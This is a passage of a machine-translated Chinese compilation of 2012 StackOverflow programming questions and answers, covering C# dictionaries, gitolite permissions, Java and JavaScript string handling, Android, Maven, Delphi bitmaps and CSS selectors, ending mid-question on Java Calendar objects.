# StackOverflow 问答 10499000-10499999

# c# - 浏览字典 C＃

> ID：10499000
> 
> 赞同：5
> 
> 时间：2012-05-08T12:52:28.253
> 
> 标签：c#, c#-4.0

浏览字典的更好方法是什么？当我有 IDictionary 时，我曾经使用下面的代码：

假设我有 IDictionary 命名`freq`

```
IEnumerator enums = freq.GetEnumerator();
while (enums.MoveNext())
{
    string word = (string)enums.Key;
    int val = (int)enums.Value;
    .......... and so on

} 
```

但现在，我想用字典做同样的事情

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-08T12:54:29.330

a 中的默认枚举器`foreach`为您提供`KeyValuePair<TKey, TValue>`：

```
foreach (var item in dictionary)
// foreach (KeyValuePair<string, int> item in dictionary)
{
    var key = item.Key;
    var value = item.Value;
} 
```

这只是编译成直接与枚举器一起工作的代码，就像在旧代码中一样。

或者你可以直接枚举`.Keys`or `.Values`（但在这种情况下你只能得到一个键或一个值）：

```
foreach (var key in dictionary.Keys)

foreach (var val in dictionary.Values) 
```

或者当然 linq 对字典起作用：

[字典中的 C# linq<>](https://stackoverflow.com/questions/2549563/c-sharp-linq-in-dictionary)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-05-08T12:54:34.460

好吧，你*可以*用 做同样的事情，但在*这两种*`Dictionary`情况下使用它会更干净：`foreach`

 *```
foreach (var entry in dictionary)
{
    string key = entry.Key;
    int value = entry.Value;
    // Use them...
} 
```

这相当于：

```
using (var iterator = dictionary.GetEnumerator())
{
    while (iterator.MoveNext())
    {
        var entry = iterator.Current;
        string key = entry.Key;
        int value = entry.Value;
        // Use them...
    }
} 
```

显式调用和迭代自己*很少有用。*`GetEnumerator`它适用于少数情况，例如当您想以不同方式处理第一个值时，但如果您要以相同方式处理*所有*条目，请使用`foreach`.

（请注意，它实际上等同于`var`在此处使用，但*不*等同于声明 an `IEnumerator<KeyValuePair<string, int>>`- 它实际上将使用嵌套[`Dictionary.Enumerator`](http://msdn.microsoft.com/en-us/library/k3z2hhax.aspx)结构。这是您*通常*不需要担心的细节。）

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-08T13:01:21.413

该`foreach`语句通过枚举器自动迭代。

```
foreach (KeyValuePair<string,int> entry in freq) {
    string word = entry.Key;
    int val = entry.Value;
    .......... and so on

} 
```*

# git - 请帮助我了解 gitolite 用户

> ID：10499002
> 
> 赞同：2
> 
> 时间：2012-05-08T12:52:36.303
> 
> 标签：git, gitolite

出于某种原因，我的 gitolite 没有附带示例配置文件，而且我似乎在任何地方都找不到，如果有人能找到我的副本，我确定这个问题在该文件中得到了回答，拜托！！

无论如何，gitolite 配置文件的格式很简单，这是我的一个片段

```
gitolite conf
# please see doc/gitolite.conf.mkd for details on syntax and features

@nmscDevs = dev1@compaid.com dev2@compaid.com dev3@compaid.com
@buildMgr = william_slepecki@compaid.com dev4@compaid.com

repo    gitolite-admin
    RW+     =   gitadmin william_slepecki@compaid.com

repo    grindstone
    RW+ = gitadmin
    RW+ prod$ = @buildMgr
    - prod$ = @nmscDevs
    RW = @nmscDevs 
```

我的 keydir 文件夹中有几个公钥：

```
keydir/
gitadmin.pub
william_slepecki@compaid.com.pub 
```

我的问题是 gitolite 似乎忽略了为个人用户设置的权限。除非我让 gitadmin 用户完全控制，否则在存储库上没有任何作用（读取、写入等）。然后好像大家都使用了 gitadmin 用户的权限。我像这样克隆存储库

```
git clone git@server:grindstone.git 
```

但是当我尝试用这样的东西克隆时

```
git clone 'dev1@compaid.com'@server:grindstone.git 
```

我提示输入密码。每个用户都需要在服务器上拥有一个帐户，以便他们可以通过 ssh 登录吗？

权限在 gitolite 中究竟是如何工作的？我被引导理解 git 用户需要一个帐户才能 ssh 进入服务器，然后一旦 gitolite 接管它使用与 git 请求一起传递的电子邮件来确定权限，我在这里错了吗？我错过了什么？

顺便说一句，这是我的 .ssh/config

```
host server
     user git
     hostname server
     identityfile ~/.ssh/gitadmin

host server
     user william_slepecki@compaid.com
     hostname server
     identityfile ~/.ssh/id_rsa 
```

更新：我已经升级到最新版本的 gitolite，当我尝试克隆时，我得到了这个

```
$ git clone git@server:testing.git
Cloning into 'testing'...
FATAL: R any testing gitadmin DENIED by fallthru
(or you mis-spelled the reponame)
fatal: The remote end hung up unexpectedly 
```

我的配置文件现在看起来像这样：

```
repo testing
    RW+ = william_slepecki 
```

我的 .ssh 配置没有改变。另外，我的日志中有这个

```
2012-05-08.13:01:13     19027   ssh     ARGV=gitadmin   SOC=git-upload-pack 'testing.git'       FROM=10.99.5.146
2012-05-08.13:01:13     19027           access(testing, gitadmin, R, 'any'),-> R any testing gitadmin DENIED by fallthru
2012-05-08.13:01:13     19027           trigger,Writable,access_1,ACCESS_1,testing,gitadmin,R,any,R any testing gitadmin DENIED by fallthru 
```

这是我的全局 git 配置的顶部片段

```
[user]
    name = Willie Slepecki
    email = william_slepecki@compaid.com 
```

为什么这仍然坚持将 gitadmin 放在 repo 上，为什么不使用 william_slepecki？这究竟是从哪里得到要使用的名称的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T18:45:09.240

好吧，我的问题是好几倍。

首先，我误解了 gitadmin 密钥的作用。我认为，因为这是唯一在服务器上拥有实际帐户的用户，因此它需要在所有开发人员工作站上。事实证明这是错误的。gitolite 获取 keydir 目录中的密钥，并在推送时将它们添加到 git/.ssh/authenticated_keys 文件中。这允许 keydir 中的所有密钥作为机器上的用户 git 登录。由于 git 用户没有与之关联的控制台，因此不存在安全漏洞。

其次，我的 ~/.ssh/conf 文件。由于我不明白#1 是如何工作的，我认为 git 以某种方式将电子邮件地址作为用户名作为 git 命令的一部分传递。一旦我弄清楚#1，我就能够清理配置文件以映射 git@server 用户并将我的正常用于其他一切。

一旦理解并解决了这两个问题，所有权限就开始正常工作。我现在已经替换了服务器上的 gitadmin 用户密钥，以使开发人员站上的用户密钥无效，并更新了我所有的开发人员配置。管理层又高兴了。

感谢大家。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:14:50.690

我将指出您的两个主要错误：

第一个错误：Gitolite 仅使用在 keydir 中找到的密钥的用户部分（“@”之前的部分）。
例如： gitolite 只识别一个用户，`william_slepecki`, 用于密钥`william_slepecki@compaid.com.pub`和`william_slepecki@anothercompaid.org.pub`，这里唯一的一点是该用户可以使用 2 个不同的密钥进行身份验证，您不能授予密钥权限，只能授予用户权限。

第二个错误：您的 gitolite 服务可能仅由一个普通系统用户提供`git`，因此应该建立连接`git@server.com:repo.git`，gitolite 用户不需要或没有系统帐户，只需一个 ssh 密钥，因此连接`william_slepecki@server.com:repo.git`将永远无法工作

# java - 如何从字符串中删除回车符

> ID：10499005
> 
> 赞同：12
> 
> 时间：2012-05-08T12:52:46.707
> 
> 标签：java, regex, carriage-return

```
String s ="SSR/DANGEROUS GOODS AS PER ATTACHED SHIPPERS
/DECLARATION 1 PACKAGE

NFY
/ACME CONSOLIDATORS" 
```

如何去除“PACKAGE”和“NFY”之间的空格？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-05-08T12:56:36.690

Java`String.replaceAll`实际上采用正则表达式。您可以使用以下命令删除所有换行符：

```
s = s.replaceAll("\\n", "");
s = s.replaceAll("\\r", ""); 
```

但这将删除*所有*换行符。

注意 double `\`'s: 以便传递给正则表达式解析器的字符串是`\n`.

你也可以这样做，这更聪明：

```
s = s.replaceAll("\\s{2,}", " "); 
```

这将删除所有 2 个或更多空格的序列，用一个空格替换它们。由于换行符也是空格，它应该为您解决问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-08T12:54:49.983

试试这个代码：

```
s = s.replaceAll( "PACKAGE\\s*NFY", "PACKAGE NFY" ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-02-03T02:29:39.980

```
s = s.replaceAll("[\\n\\r]", ""); 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-05-08T12:55:34.270

您是否尝试过替换功能？类似的东西：

```
youString.Replace("\r", "") 
```

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2012-05-08T12:56:36.633

```
string = string.replace(/\s{2,}/g, ' '); 
```

# magento - 如何通过magento编程创建可配置产品

> ID：10499009
> 
> 赞同：2
> 
> 时间：2012-05-08T12:53:01.030
> 
> 标签：magento

我想通过编程创建可配置的产品，我们如何创建它？我有 10000 多个简单产品，我必须实现从这些简单产品创建可配置产品的功能

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T12:55:46.270

只需创建与简单产品相同的可配置产品，但将其类型作为配置产品并将简单产品 ID 关联到此配置产品

# javascript - 正则表达式帮助拆分字符串

> ID：10499017
> 
> 赞同：0
> 
> 时间：2012-05-08T12:53:53.933
> 
> 标签：javascript, regex

我想将此字符串拆分为一个数组

```
"Test One@,@10000@,@Test Two@,@10001" 
```

只留下话，剩下的就可以走了。所以我最终会得到

```
[ "Test One", "Test Two" ] 
```

正则表达式正在逃避我。有什么帮助吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-08T12:58:11.447

如果这就是你所做的一切，我会使用 split 代替：

```
>>> "Test One@,@10000@,@Test Two@,@10001".split('@,@');
["Test One", "10000", "Test Two", "10001"] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-08T13:00:19.233

```
var string = "Test One@,@10000@,@Test Two@,@10001";

var array = string.match(/([a-z\s]+)/ig); // ["Test One", "Test Two"] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T12:58:24.817

[`string.split(..)`](http://www.w3schools.com/jsref/jsref_split.asp)方法呢？

```
var split_array = "Test One@,@10000@,@Test Two@,@10001".split("@.@"); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-08T13:01:30.880

你不需要正则表达式。您可以使用标准字符串函数。基于**Leonard Challis**的回答（返回所有元素，而不仅仅是单词），您可以执行以下操作：

```
var myStrings = "Test One@,@10000@,@Test Two@,@10001".split('@,@');
var splitList = [];

var i = myStrings.length;
while(i--) {
    if(IsNaN(myStrings[i])) splitList.push(myStrings[i]);
} 
```

`splitList`现在将只包含单词，这正是您所要求的。它的内容如下所示：

```
["Test One", "Test Two"] 
```

这是你要求的。

# xml - 在jsp中应用xsl合并两个xml文件

> ID：10499024
> 
> 赞同：1
> 
> 时间：2012-05-08T12:54:20.903
> 
> 标签：xml, jsp, xslt

我做了一个 xsl 将两个 xml 合并为一个，然后使用输出到另一个 xsl 以获得 html 视图。

当我使用 xmlSpy 对其进行测试时，它工作得非常好，但是当我将它们放在 java web 应用程序下时，出现了问题。

xsl如下：

```
<?xml version="1.0" encoding="UTF-8" ?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="xml" indent="yes" encoding="UTF-8"  />
  <xsl:strip-space elements="*" />
  <xsl:variable name="xsdresult" select="document('xsdResult.xml')" />
  <xsl:variable name="schresult" select="document('result.xml')" />
  <xsl:template match="/">
    <xsl:result-document href="fullresult.xml" method="xml">
        <fullresult> 
           <xsl:copy-of select="$schresult/node()" />  
           <xsl:copy-of select="$xsdresult/node()" />     
        </fullresult>
    </xsl:result-document>
  </xsl:template>
</xsl:stylesheet> 
```

而且这个文件和xml文件都在同一个目录下，输出文件也是一样的。

应用此 xslt 的 jsp：

```
 <?xml version="1.0" encoding="UTF-8" ?>
    <%@ page language="java"  contentType="text/html; charset=UTF-8"
        pageEncoding="UTF-8"%>
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
    <%@taglib uri="http://jakarta.apache.org/taglibs/xsl-1.0" prefix="xsl"%>
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>

    <%@ page%>

    <title>test</title>
    </head>

    <body>
   <p>
  <xsl:apply xml="WEB-INF/classes/result/result.xml" xsl="WEB-INF/classes/result/merge.xsl" />
 <xsl:apply xml="WEB-INF/classes/result/xsdResult.xml" xsl="WEB-INF/classes/result/merge.xsl" />
 <xsl:apply xml="WEB-INF/classes/result/fullresult.xml" xsl="WEB-INF/classes/result/anotherone.xsl" />
   </p>
    </body>
    </html> 
```

问题出在 merge.xsl、document('xsdResult.xml') 和 document('result.xml') 中，它们总是在 eclipse_home 目录下搜索，而不是在 tomcat webapps 目录下搜索。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:47:27.240

您需要的是[URI Resolver](http://docs.oracle.com/javase/6/docs/api/javax/xml/transform/URIResolver.html)。查看[ApplyTag 内部发生的情况，](http://kickjava.com/src/org/apache/taglibs/xsl/ApplyTag.java.htm)我不知道您将如何提供自己的。

似乎还有另一个 Apache taglib 可以做类似的事情 - [xtags](http://jakarta.apache.org/taglibs/doc/xtags-doc/index.html)。与 相比，`StyleTag`in there 似乎做得更好`ApplyTag`，它*使用*了 URI Resolver（查看[第 154 行](http://kickjava.com/src/org/apache/taglibs/xtags/xslt/StyleTag.java.htm)）。但是，我没有看到一个干净的方法来传递你自己的而不继承它。您可以将代码进一步跟踪到[URLHelper 中](http://kickjava.com/src/org/apache/taglibs/xtags/util/URLHelper.java.htm)，看看在`document()`函数中修改 URI 是否`/WEB-INF/...`会产生更好的结果。

尽管如此，您很可能会在转换的第二步遇到另一个问题，您希望从文件系统中获取第一遍的结果。第一遍将转储到`fullresult.xml`哪里？应用程序服务器代表运行的进程是否有权写入其中的文件系统？您甚至希望它写入文件系统吗？

我觉得你最好用普通的 Java 编写一个小的实用程序类，它可以使用 JAXP API 来管道你的转换。您将拥有对解析器功能（包括 URI 解析）的所有控制，并且您不需要将文件系统用作中间存储。当您这样做时，您还可以考虑一次性运行转换。您可以将文档合并到 a 中`xsl:variable`，然后在其上应用模板，或者仅将模板分别应用于每个`document()`函数的结果。当然，除非您还需要保留 XML 合并的结果。

希望能帮助到你

# java - 不同方向Android的新活动

> ID：10499025
> 
> 赞同：0
> 
> 时间：2012-05-08T12:54:25.053
> 
> 标签：java, android, android-layout, orientation, landscape-portrait

我知道我可以在我的 res/ 文件夹中创建一个名为 layout-land 的文件夹，Android 会自动处理它。我的问题是，当我的方向从纵向变为横向时，如果我想调用一个新的 Activity 怎么办？

我有的：

*   由按钮和滚动视图组成的肖像 xml 文件
*   包含多个按钮、文本视图和编辑文本的横向 xml 文件
*   两者都称为 main.xml （但在它们各自的文件夹中）
*   一个调用 setContentView(main.xml) 的 Activity

但是，此活动必须初始化所有按钮、文本视图等，但是当我将方向更改回纵向时，它会强制关闭，因为这些按钮不在该 xml 文件中！

我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:00:49.933

尝试使用`getResources().getConfiguration().orientation`来检查当前方向。因此，当您倾斜设备时，您可以避免膨胀错误的资源。

-> [http://developer.android.com/reference/android/content/res/Configuration.html#orientation](http://developer.android.com/reference/android/content/res/Configuration.html#orientation)

另一种（但不好！）方法可能是 override `onConfigurationChanged`，因此您的土地布局将不会被使用，并且您可以在倾斜时推动另一个活动。就像是：

```
@Override
public void onConfigurationChanged(Configuration newConfig) {
    super.onConfigurationChanged(newConfig);
    //push new activity via intent
} 
```

但我不会向你推荐这个。尝试第一种方法，并告诉我这是否适合您。;)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:20:40.633

Thomas 的解决方案应该有效，但也知道如果纵向和横向模式共有的按钮执行相同的操作，您可以在尝试强制转换/分配之前检查 findViewByID(...) 是否为空。从 findViewByID(...) 的文档中，这样的`The view if found or null otherwise.`东西应该可以工作：

```
Object x = findViewByID(R.id.something) != null;
if(x != null)
{
    //cast it to whatever it really is (textview, button, etc)

    //Add whatever listeners you want
} 
```

请注意，我仍然会使用 Thomas 的解决方案，因为这样您只需要检查一个属性，而不是必须在布局之间不同的每个控件上检查 null。

# android - 我应该始终将 CookieSyncManager 与 CookieManager 一起使用吗？

> ID：10499034
> 
> 赞同：0
> 
> 时间：2012-05-08T12:54:53.913
> 
> 标签：android, cookies

如果我必须将 a 传递`Cookie`给 a `WebView`，那么我必须打电话

> CookieManager.getInstance().setCookie();

在`WebView.loadUrl()`API 之前。

我也应该打电话吗

> CookieSyncManager.getInstance().sync()

如果是，为什么？

更一般地说，`CookieSyncManager`应在何时何地使用`CookieManager`?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-12T10:44:18.817

CookieManager 允许您删除/添加/...您的 Cookie。

当您想要持久化 cookie 时，应该调用 CookieSyncManager。如果您不调用它，它将保留在 RAM 中（[请参阅文档](http://developer.android.com/reference/android/webkit/CookieSyncManager.html)）。

# maven - 如何在 maven-war-plugin 中为 web.xml 设置显示名称

> ID：10499038
> 
> 赞同：4
> 
> 时间：2012-05-08T12:55:16.960
> 
> 标签：maven, web.xml, maven-war-plugin

如何使用 maven-war-plugin 通过 maven 定义 web.xml 显示名称？

在 maven-ear-plugin 中有一个配置选项 displayName 来设置 EAR / application.xml display-name 属性。

方法错误？只需在 web.xml 中手动设置？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-27T20:30:19.060

您需要使用 Maven 的[Web 资源过滤](http://maven.apache.org/plugins/maven-war-plugin/examples/adding-filtering-webresources.html)方法。在 maven-war-plugin 中设置以下配置：

```
<plugin>
<artifactId>maven-war-plugin</artifactId>
<version>2.2</version>
<configuration>
    <webResources>
        <resource>
            <directory>src/main/webapp/WEB-INF/</directory>
            <targetPath>WEB-INF</targetPath>
            <includes><include>web.xml</include></includes>
            <filtering>true</filtering>
        </resource>
    </webResources>
</configuration>
</plugin> 
```

在您的 web.xml 中，您可以使用 pom.xml 中定义的任何属性。所以你可以例如使用：

```
<display-name>${project.name} - ${project.version}</display-name> 
```

那将呈现为

```
<display-name>My Awesome Webapp - 1.0.0-SNAPSHOT</display-name> 
```

如果您使用 Eclipse，则需要[m2e-wtp](https://www.eclipse.org/m2e-wtp/)（查看主页中的 Web 资源过滤截屏视频）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-01-30T14:31:17.583

更简单...

```
<plugin>
  <artifactId>maven-war-plugin</artifactId>
  <version>2.4</version>
  <configuration>
    <filteringDeploymentDescriptors>true</filteringDeploymentDescriptors>
  </configuration>
</plugin> 
```

请参阅[filterDeploymentDescriptors](https://maven.apache.org/plugins/maven-war-plugin/war-mojo.html#filteringDeploymentDescriptors)的文档。这从 2.1 开始可用，但默认情况下被禁用。

# cloud-foundry - VMC 隧道崩溃

> ID：10499043
> 
> 赞同：-1
> 
> 时间：2012-05-08T12:55:34.770
> 
> 标签：cloud-foundry, devkit, vmc

我正在尝试执行 vmc 隧道，但出现错误“ruby 解释器已停止工作”。试图在互联网上找到问题所在，但我看到的唯一解决方案是将 ruby​​ 版本升级到 1.9.3 ，但我已经有了这个版本。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T18:56:05.533

这昨天在 Win7 上使用 ruby​​ 1.9.2p290 对我有用。Ruby 1.9.3p194 失败，出现同样的错误。

请记住，隧道是在本地计算机上运行的 mysql 客户端与 cloudfoundry 上的 mysql 服务之间的连接，因此第 1 步是确保您的本地 mysql 工作，包括您的路径，以便 vmc 可以轻松找到您的客户端。有关详细信息，请参阅[http://docs.cloudfoundry.com/tools/vmc/caldecott.html](http://docs.cloudfoundry.com/tools/vmc/caldecott.html)中的步骤

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-11T18:14:09.743

您能否执行以下命令并将输出粘贴到此处？

```
ruby -v
vmc -v 
```

# backbone.js - Backbone.js `el` 和 `events` 没有正确绑定

> ID：10499044
> 
> 赞同：1
> 
> 时间：2012-05-08T12:55:39.357
> 
> 标签：backbone.js

出于某种原因，虽然以前工作正常，但 have`el`和`events`bindings 现在停止正常工作。

我已经有了：

```
User.HeaderView = Backbone.View.extend({
    el: '#header',
    template: _.template($('#header-template').html()),
    events: {
        "click .login": "login"
    },
    initialize: function(parentView) {
        this.parentView = parentView;
    },
    render: function() {
        this.parentView.render();
        this.el.innerHTML = this.template(/* pass model */);
    }
}); 
```

以前这工作得很好，但由于某种原因，`el`不再正确绑定到`#header`DOM。相反，它是用 empty 实例化的`div`，这可以很容易地确认：如果我`el`使用 Firebug ( `console.log(this.$el.parent().html()`) 进行调试，我会得到：

```
null 
```

我期望得到的是这样的：

```
<div id="header"><ul></ul></div> 
```

这是我目前用来初始化视图的方法：

```
view.headerView = new HeaderView(parentView); 
```

有什么想法可以解决这个问题或进一步调试吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:13:44.967

`initialize`期望一个包含您希望传递给视图的选项的对象。在这里，您传递了一个视图，它是一个对象，并且可能`el`已经设置了一个属性，覆盖了您在`HeaderView`. 尝试

```
User.HeaderView = Backbone.View.extend({
    el: '#header',
    template: _.template($('#header-template').html()),
    events: {
        "click .login": "login"
    },
    initialize: function(options) {
        this.parentView = options.parentView;
    },
    render: function() {
        this.parentView.render();
        this.el.innerHTML = this.template(/* pass model */);
    }
});

new HeaderView({parentView:parentView}); 
```

# android - getParcelableExtra 的奇怪行为（键 X 预期 Parcelable 但值为 Y）

> ID：10499049
> 
> 赞同：0
> 
> 时间：2012-05-08T12:55:59.980
> 
> 标签：android, android-intent, parcelable

有人可以解释为什么这段代码不起作用吗？

```
Intent i = new Intent(this.context, SomeClass.class);
HashMap<String, String> tmp1 = new HashMap<String, String>();
Log.d(TAG, "IN: " + String.valueOf(tmp1));
i.putExtra("VAR", tmp1);
HashMap<String, String> tmp2 = i.getParcelableExtra("VAR");
Log.d(TAG, "OUT: " + String.valueOf(tmp2)); 
```

我期望得到的：

*   HashMap**是可**分割的。`tmp1`应该相等`tmp2`。

我实际得到的（LogCat）：

*   *调试：* **在：{}**
*   *警告：*键是`VAR`预期`Parcelable`的，但值是`java.util.HashMap`. 已返回默认值`<null>`。
*   *警告：*尝试强制转换生成的内部异常：`java.lang.ClassCastException: java.util.HashMap`
*   *调试：* **OUT：空**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:00:09.553

我想你错了*，*`HashMap`不是。但是，它是，因此您要添加额外内容并尝试将其读取为，这会导致错误。 *`Parcelable``Serializable``Serializable``Parcelable`*

# c++ - 配置和生成文件

> ID：10499067
> 
> 赞同：0
> 
> 时间：2012-05-08T12:57:24.430
> 
> 标签：c++, makefile, configure

我想用这样的选项扩展我的 makefile.am：

这是 makefile.am 的原始部分：

```
OPTIONS := -Wl,-rpath,/usr/local/lib 
if DEBUGGING
  OPTIONS += -O0 -g3 -Wall 
```

这就是我要添加的内容

```
OPTIONS := -Wl,-rpath,/usr/local/lib 
if WIN
  OPTIONS += -static-libgcc -static-libstdc++
if DEBUGGING
  OPTIONS += -O0 -g3 -Wall 
```

这样我就可以将 --enable-win 传递给 ./configure 并使用“if WIN”部分。如我所见，我必须将此选项添加到 configure.ac 文件中，但我不知道如何。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T14:08:12.273

您应该在 configure.ac 文件中使用宏 AC_ARG_ENABLE。

AC_ARG_ENABLE 允许您定义另一个命令行选项。例子：

```
 AC_ARG_ENABLE(debug-rwlock,
 [  --enable-debug-rwlock  Enable an RWLock that prints debug notices \
  on the screen. This is a debugging feature which should not be \
  usually enabled],
 [ debug_rwlock=yes
 ]) 
```

# javascript - Jquery 菜单：默认活动 DIV 容器

> ID：10499068
> 
> 赞同：1
> 
> 时间：2012-05-08T12:57:30.900
> 
> 标签：javascript, jquery, html, menu, submenu

上面显示的代码工作正常，但以下情况除外。当我打开网页时，DIV 容器的内容是空的，我只能看到导航菜单。一旦我按下菜单或子菜单项，内容就会充满正确的数据。那么，我的问题是如何默认使用 DIV 容器“submenu11”？代码行`$active = $('#submenu11').addClass('active');`不能解决这个问题。

看看[jFiddle](http://jsfiddle.net/Liana_N/ynVvt/)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T08:31:11.793

```
$(document).ready(function() {
    //code for ajax calling

    $('#submenu11').addClass('active').trigger('click);
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T15:54:01.617

你可以在小提琴中添加css吗？我不完全理解这个问题。

据我了解，您想默认显示 submenu11 对吗？所以我假设其余的东西应该被隐藏，我假设它已经在 css 中完成了。你的代码

```
$active = $('#submenu11').addClass('active'); 
```

不做任何事情，因为您将其分配给 $active

我想你可能正在寻找这样的东西？

```
$(document).ready(function() {
    $('#submenu11').addClass('active');
}); 
```

这是假设您的所有 css 类都已正确定义

# delphi - 移动位图像素

> ID：10499069
> 
> 赞同：4
> 
> 时间：2012-05-08T12:57:36.607
> 
> 标签：delphi, delphi-xe

**如果我想移动/移动位图的像素，我该怎么做？**

```
procedure MovePixels(Bitmap: TBitmap; Horizontal, Vertical: Integer);
begin
  { move the Bitmap pixels to new position }
end; 
```

**例子：**

![在此处输入图像描述](../Images/5868117eca06450b543a35a01f504e2d.png)

*例如，通过调用* `MovePixels(Image1.Picture.Bitmap, 20, 20)` *将输出如下：*

![在此处输入图像描述](../Images/d3f1cce27ea4c53c8232c929022d3a58.png)

还可以指定/更改移动像素后留下的画布颜色。所以在这个例子中，灰色/棕色可能是蓝色等。

我注意到有`Bitmap.Canvas.Pixels`和`Bitmap.Canvas.MoveTo`属性，这是我需要做的吗？

我真的不知道，我敢打赌它是如此简单..

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-08T13:06:18.243

您无法轻松移动像素，但可以制作副本。

```
var
  Source, Dest: TRect;
....
Source := Rect(0, 0, Bitmap.Width, Bitmap.Height);
Dest := Source;
Dest.Offset(X, Y);
Bitmap.Canvas.CopyRect(Dest, Bitmap.Canvas, Source); 
```

剩下的就是用您选择的颜色填充空间，我相信您可以通过几次调用来轻松完成`FillRect`。

但是，我认为不就地尝试会更简单。相反，我会创建一个新的位图。或许是这样的：

```
function CreateMovedImage(Bitmap: TBitmap; X, Y: Integer; BackColor: TColor): TBitmap;
var
  Source, Dest: TRect;
begin
  Source := Rect(0, 0, Bitmap.Width, Bitmap.Height);
  Dest := Source;
  Dest.Offset(X, Y);

  Result := TBitmap.Create;
  Try
    Result.SetSize(Bitmap.Width, Bitmap.Height);

    Result.Canvas.Brush.Style := bsSolid;
    Result.Canvas.Brush.Color := BackColor;
    Result.Canvas.FillRect(Source);

    Result.Canvas.CopyRect(Dest, Bitmap.Canvas, Source);
  Except
    Result.Free;
    raise;
  End;
end; 
```

# html - 如何将css设置为输入标签的特定属性

> ID：10499074
> 
> 赞同：1
> 
> 时间：2012-05-08T12:58:01.353
> 
> 标签：html, css

我有以下代码：

**HTML**

```
<div id=addQuesion">
  <li>
    <label>Text</label>
    <input type="text"/>
  </li>
  <li>
    <label>Try</label>
    <input type="button"/>
  </li>
</div> 
```

**CSS**

```
#addQuesion li label {
  position: relative;
  top: 10px;
  left: 10px;
  font-size: 25px;
  border: 1px black solid;
  padding-right: 50px;
}

#addQuesion li input {
  position: relative;
  top: 10px;
  left: 10px;
  width: 400px;
  font-size: 25px;
} 
```

确定这两个输入将采用 400px 的宽度，但我在问如何使每个输入（文本、按钮）具有不同的宽度。

我知道我可以使用这样的样式，`<input style="..." />`但我需要使用 CSS。我也知道我可以`<div>`为每个输入使用不同的，但我想把它们放在同一个 div 中。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-08T13:02:34.357

您可以按类型定位输入，从而对它们应用不同的样式：

**CSS**

```
/* Text Field */
#addQuesion input[type="text"] {
  width: 200px;
}

/* Button */
#addQuesion input[type="button"] {
  width: 20px;
} 
```

您可以在此处阅读有关此内容的更多信息：[W3C 属性选择器](http://www.w3schools.com/css/css_attribute_selectors.asp)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-08T13:00:06.893

使用属性选择器：

```
#addQuestion li input[type="text"]
{
   /* ... */
} 
```

或者

```
#addQuestion li input[type="button"]
{
   /* ... */
} 
```

这是一个常见的问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-08T13:15:04.403

您可以为每个输入添加一个类并为每个类定义不同的样式。

HTML：

```
<div id=addQuesion">
    <li>
        <label>Text</label>
        <input class="input1" type="text"/>
    </li>
    <li>
        <label>Try</label>
        <input class="input2" type="button"/>
    </li>
</div> 
```

CSS：

```
#addQuesion li input.input1{
    width: 400px;
}
#addQuesion li input.input2{
    width: 600px;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-08T13:02:52.583

你可以使用这样的东西：

```
[title]
{
color:blue;
} 
```

[参考](http://www.w3schools.com/css/css_attribute_selectors.asp)

# java - 在 while 循环中出现日历问题

> ID：10499075
> 
> 赞同：1
> 
> 时间：2012-05-08T12:58:07.203
> 
> 标签：java, calendar, arraylist, while-loop

我正在开发这个时间容器，它基本上包含一个名为 week 的类的实例，它由 2 个日历实例（开始和结束）和许多其他管理信息（现在不相关）组成

问题是我在while循环中创建了这些Week实例，并且我看到在创建week实例期间（在while循环中打印日历毫秒），millis很好，但是如果我检查列表的内容几个星期，他们不是！Calendar 的所有实例（开始和结束）在所有周中都包含相同的值。

我写了一些代码让你们清楚地理解问题，有类（Container和BiggerContainer）：

```
public class Container
{
  private static final long serialVersionUID = 1L;

  private Calendar          start;

  private Calendar          end;

  public Container(Calendar start, Calendar end)
  {

    this.start = start;
    this.end = end;

  }

  public Calendar getStart()
  {
    return start;
  }

  public Calendar getEnd()
  {
    return end;
  }
}

Bigger container:

    public class BiggerContainer
{
  private static final long    serialVersionUID = 1L;

  private ArrayList<Container> containerList    = new ArrayList<Container>();

  public void init()
  {

    int i = 0;

    long max = 604800000;

    long nu = Calendar.getInstance().getTimeInMillis();

    Calendar startC = Calendar.getInstance();

    Calendar endC = Calendar.getInstance();

    while (i <= 5)
    {

